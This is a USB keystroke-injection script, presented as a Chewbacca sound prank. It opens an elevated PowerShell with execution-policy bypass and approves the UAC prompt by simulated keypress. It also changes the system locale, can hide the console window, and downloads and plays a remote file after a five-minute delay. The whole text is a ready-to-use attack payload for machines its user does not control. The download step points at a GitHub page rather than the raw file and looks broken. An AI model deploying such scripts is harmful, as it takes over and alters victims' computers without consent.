//========================== Mon's Chewbacca sound Player ==============================

//SYNOPSIS
// This script will play a Chewbacca sound.

hide=false; // set to true to hide the console window on the target

layout("us")
press("GUI r");
delay(500);
type("powershell -NoP -NonI -Exec Bypass");
press("CONTROL SHIFT ENTER");
delay(2500);
press("ALT y");
delay(3000);
type("Dism /online /Get-Intl");
press("ENTER")
type("Set-WinSystemLocale en-US");
press("ENTER")
type("Set-WinUserLanguageList en-US -Force");
press("ENTER")
delay(500);

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(1000);
}

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
    delay(1000);
}

if (hide) { hidePS(); }
delay(1000);
assurePS32();
delay(2000);

type("start-sleep 300");
press("ENTER");
type("irm -uri \"https://github.com/apsecdev/DigiSpark-Scripts/blob/master/Hi_Chewy/Chewbacca.wav\" -OutFile \"$env:temp\\play.wav\"");
press("ENTER");
type("Add-Type -AssemblyName presentationCore");
press("ENTER");
type("$filepath = [uri] \"$env:temp\\play.wav\"");
press("ENTER");
type("$wmplayer = New-Object System.Windows.Media.MediaPlayer;$wmplayer.Open($filepath)");
press("ENTER");
type("Start-Sleep 2");
press("ENTER");
type("$duration = $wmplayer.NaturalDuration.TimeSpan.TotalSeconds");
press("ENTER");
type("$wmplayer.Play();Start-Sleep $duration;$wmplayer.Stop();$wmplayer.Close();");
press("ENTER");